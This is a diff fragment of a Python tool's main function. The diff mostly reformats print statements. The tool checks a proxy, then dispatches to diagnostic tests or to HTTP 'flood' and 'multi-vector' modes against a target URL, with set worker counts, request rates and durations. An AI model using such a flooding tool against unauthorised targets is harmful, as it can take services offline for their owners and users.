+    print("{}  Hostname   : {}{}".format(DIM, hostname, RESET))
+    print("{}  Proxy      : {}{}".format(DIM, PROXY_URL, RESET))
 
-    # ── Always check proxy first ──────────────────────────────────────────────
     if not test_proxy_reachability():
-        fail("Proxy is unreachable — aborting.")
+        fail("Proxy is unreachable \u2014 aborting.")
         sys.exit(1)
 
-    # ── Mode selection menu ───────────────────────────────────────────────────
     mode = show_menu()
 
-    # ── Diagnostic ────────────────────────────────────────────────────────────
     if mode == "diag":
         test_egress_ip()
         if hostname and not all(c.isdigit() or c == "." for c in hostname):
@@ -729,29 +741,25 @@ def main():
             test_tls(hostname, port=tls_port)
         test_http_post(target_url)
         test_latency(target_url)
-        print(f"\n{BOLD}{GREEN}{'='*60}")
-        print(f"  All L7 tests complete.")
-        print(f"{'='*60}{RESET}\n")
+        print("\n{}{}{}".format(BOLD+GREEN, "="*60, RESET))
+        print("{}  All L7 tests complete.{}".format(BOLD+GREEN, RESET))
+        print("{}{}{}".format(BOLD+GREEN, "="*60, RESET))
+        print()
         return
 
-    # ── Flood / Multi-vector ──────────────────────────────────────────────────
     workers, rps, duration = prompt_flood_params()
-
-    print(f"\n{DIM}  Workers : {workers}  |  RPS target : {rps:.0f}  |  Duration : {duration:.0f}s{RESET}")
+    print("\n{}  Workers : {}  |  RPS target : {:.0f}  |  Duration : {:.0f}s{}".format(
+        DIM, workers, rps, duration, RESET))
 
     if mode == "multi":
         run_multi_vector(target_url, workers=workers, rps=rps, duration=duration)
     else:
-        run_flood(
-            target_url=target_url,
-            workers=workers,
-            rps=rps,
-            duration=duration,
-            method=mode,
-        )
-        print(f"\n{BOLD}{GREEN}{'='*60}")
-        print(f"  Flood complete.")
-        print(f"{'='*60}{RESET}\n")
+        run_flood(target_url=target_url, workers=workers, rps=rps,
+                  duration=duration, method=mode)
+        print("\n{}{}{}".format(BOLD+GREEN, "="*60, RESET))
+        print("{}  Flood complete.{}".format(BOLD+GREEN, RESET))
+        print("{}{}{}".format(BOLD+GREEN, "="*60, RESET))
+        print()
 
 
 if __name__ == "__main__":
